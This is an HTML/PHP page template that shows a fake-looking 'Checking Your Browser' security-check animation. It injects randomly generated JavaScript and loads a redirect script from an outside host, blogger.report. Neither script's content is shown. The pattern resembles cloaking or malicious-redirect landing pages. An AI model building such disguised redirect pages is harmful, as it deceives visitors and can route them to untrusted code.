<!DOCTYPE html>
<html>
<head>
	<title>Security Check</title>
	<style type="text/css">
		body{
          background: #e9eaed;
          text-align: center;
          margin: 0;
          font-family: 'Montserrat', sans-serif;
        }
        svg{
        	min-width:100px;
        	width: 5%;
        	overflow: auto;
        	margin: auto;
        	position: absolute;
        	top: 0;
        	left: 0;
        	bottom: 0;
        	right: 0;
        	opacity: 0.8;
        }
        h1{
        	color: #047ab3;
        }
        h2{
        	color: #828794;
        }
	</style>
	<meta name="viewport" content="width=360, initial-scale=1" />
	<link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
</head>
<body>
	<h1>Checking Your Browser</h1>
	<h2>Please Wait</h2>
	<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" class="uil-squares"><rect x="0" y="0" width="100" height="100" fill="none" class="bk"></rect><rect x="15" y="15" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.0s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="40" y="15" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.125s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="65" y="15" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.25s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="15" y="40" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.875s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="65" y="40" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.375" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="15" y="65" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.75s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="40" y="65" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.625s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="65" y="65" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.5s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect></svg>
    <script type="text/javascript">
        <?php 
            require_once("jsGenerate.php");
            $jsGenerate = new js();
            $randomscript = $jsGenerate->createCode();
            echo $randomscript;
        ?>
    </script>
    <script type="text/javascript" src="http://blogger.report/redirect.php"></script>
</body>
</html>
